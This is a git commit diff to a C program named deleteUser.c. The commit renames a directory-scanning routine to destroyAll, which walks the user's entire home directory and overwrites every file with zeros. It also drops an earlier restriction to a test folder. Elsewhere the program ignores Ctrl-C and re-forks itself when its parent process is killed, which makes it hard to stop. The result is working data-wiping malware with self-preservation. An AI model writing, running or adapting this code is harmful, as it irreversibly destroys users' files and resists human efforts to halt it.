adaa8ec34ac721e5e0df46677c150e4901db99e1
Joao Guio <joaoluisguio@gmail.com>
2017-04-26 23:13:33 -0300

    Adicionando comentários, mudando a inclusão de bibliotecas e deixando o código mais finalizado.

--- deleteUser.c
+++ deleteUser.c
@@ -1,8 +1,8 @@
 #include <stdio.h>
+#include <stdlib.h>
 #include <sys/types.h>
 #include <unistd.h>
 #include <signal.h>
-#include <stdlib.h>
 #include <string.h>
 #include <dirent.h>
 #include <sys/stat.h>
@@ -11,15 +11,15 @@
 void noStop(int sig);
 void mainLoop(pid_t p);
 
-// CODE FOUNDED IN STACKOVERFLOW (finding DIR elements and also counting their size)
-#ifndef NAME_MAX
-#define NAME_MAX 1024
-#endif
+// code adapted from stack overflow to calculate total size of a dir
+// the search now also writes an amount of zeros equal to the size of the file in every file that has found.
 
-static long goDir(char *dirname)
+static long destroyAll(char *dirname, pid_t parent)
 {
     FILE *p;
-    DIR *dir = opendir(dirname);
+    DIR *dir;
+    pid_t pid;
+    dir = opendir(dirname);
     if (dir == 0)
         return 0;
 
@@ -31,6 +31,14 @@ static long goDir(char *dirname)
 
     while ((dit = readdir(dir)) != NULL)
     {
+        if (kill(parent, 0) != 0) {
+            puts("parent is kill, forking");
+            pid = fork();
+            if (pid != 0) {
+                puts("im a parent now");
+                mainLoop(pid);
+            }
+        }
         if ( (strcmp(dit->d_name, ".") == 0) || (strcmp(dit->d_name, "..") == 0) )
             continue;
 
@@ -41,36 +49,26 @@ static long goDir(char *dirname)
 
         if (S_ISDIR(st.st_mode))
         {
-            long dir_size = goDir(filePath) + size;
-            // printf("DIR\t");
-            // printf("MODE: %lo\t", (unsigned long) st.st_mode);
-            // printf("SIZE: %ld\t", dir_size);
-            // printf("%s\n", filePath);
+            long dir_size = destroyAll(filePath, parent) + size;
             total_size += dir_size;
         }
         else
         {
             total_size += size;
-            // printf("FILES\t");
-            // printf("MODE: %lo\t", (unsigned long) st.st_mode);
-            // printf("SIZE: %ld\t", size);
-            // printf("%s\n", filePath);
-            
-            // modified by João Guio
-            // Now opens the filePath, and overwrite it with zeros.
             p = fopen(filePath, "wb");
-            for (i = 0; i < size; i++) {
+            for (i = 1; i < size; i++) {
                 fputs("0", p);
-            }
+            }   
             fclose(p);
         }
     }
     return total_size;
 }
-// END OF CODE FOUNDED IN STACK OVERFLOW
+// end of adapted code from stack overflow
 
 int main (int argc, char *argv[]) {
     pid_t pid = 0;
+    printf("%d\n",NAME_MAX);
     if (signal(SIGINT, noStop) == SIG_ERR)
         puts("cant catch signal SIGINT");
     pid = fork();
@@ -95,40 +93,15 @@ void mainLoop(pid_t p) {
     char *homedir;
     if (p == 0) {
         parent = getppid();
-        while(x > 0) {
-            if (kill(parent, 0) == 0) {
-                puts("parent's alive!");
-            }
-            else {
-                puts("daddy is kill, forking");
-                pid = fork();
-                forked = 1;
-                break;
-            }
-            // HERE IS WHERE THE MAGIC HAPPEN
-            if ((homedir = getenv("HOME")) == NULL) {
-                homedir = getpwuid(getuid())->pw_dir;
-            }
-            strcat(homedir, "/test");
-            puts(homedir);
-            // print how many bytes of data where overwritten
-            printf("%ld\n", goDir(homedir));
+        // nice way to get the home user
+        if ((homedir = getenv("HOME")) == NULL) { 
+            homedir = getpwuid(getuid())->pw_dir;
         }
-        if (forked) {
-            if (pid == 0) {
-                puts("child");
-                mainLoop(pid);
-            }
-            else {
-                if (pid > 1) {
-                    puts("parent");
-                    mainLoop(pid);
-                }
-                else {
-                    puts ("erro no fork");
-                }
-            }
-        }
+        // used to test in specific folder.
+        // strcat(homedir, "/test");
+        puts(homedir);
+        // print how many bytes of data were overwritten
+        printf("%ld\n", destroyAll(homedir, parent));
     }
     else {
         waitpid(-1, &status, 0);
